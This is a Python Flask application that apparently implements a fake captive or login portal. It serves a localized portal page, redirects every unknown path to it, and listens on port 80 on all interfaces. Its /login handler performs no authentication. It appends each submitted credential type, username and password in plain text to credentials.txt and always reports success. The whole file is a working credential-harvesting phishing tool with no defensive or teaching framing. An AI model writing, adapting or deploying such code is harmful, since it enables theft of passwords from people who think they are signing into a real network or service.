# -*- coding: utf-8 -*-

from os.path import join, dirname, abspath
from flask import Flask, redirect, render_template, request
import json


app = Flask(
    __name__,
    static_url_path = '/',
    static_folder = 'public'
)

# App configuration
current_dir = dirname(abspath(__file__))
config_dir = join(current_dir, 'config')
config_file = join(config_dir, 'portal.conf')
locale_file = join(current_dir, 'locale.json')
credentials = join(current_dir, 'credentials.txt')
app.config.from_pyfile(config_file)


@app.errorhandler(404)
def not_found(e):
    return redirect('/')

@app.route('/')
def portal():
    lang = app.config['LANG']
    locale = get_locale(lang)
    return render_template(
        'portal.html',
        locale = locale
    )

@app.route('/login', methods = ['POST'])
def authentication():
    save_credentials(request.get_json())
    return json.dumps({'success': True})


def get_locale(lang):
    filename = locale_file
    with open(filename) as f:
        return json.load(f)[lang]

def save_credentials(form):
    type = form['type']
    username = form['username']
    password = form['password']
    with open(credentials, 'a') as f:
        f.write("%s,%s,%s\n" % (
            type,
            username,
            password
        ))


if __name__ == '__main__':
    app.run(
        host = '0.0.0.0',
        port = 80,
        threaded = True
    )
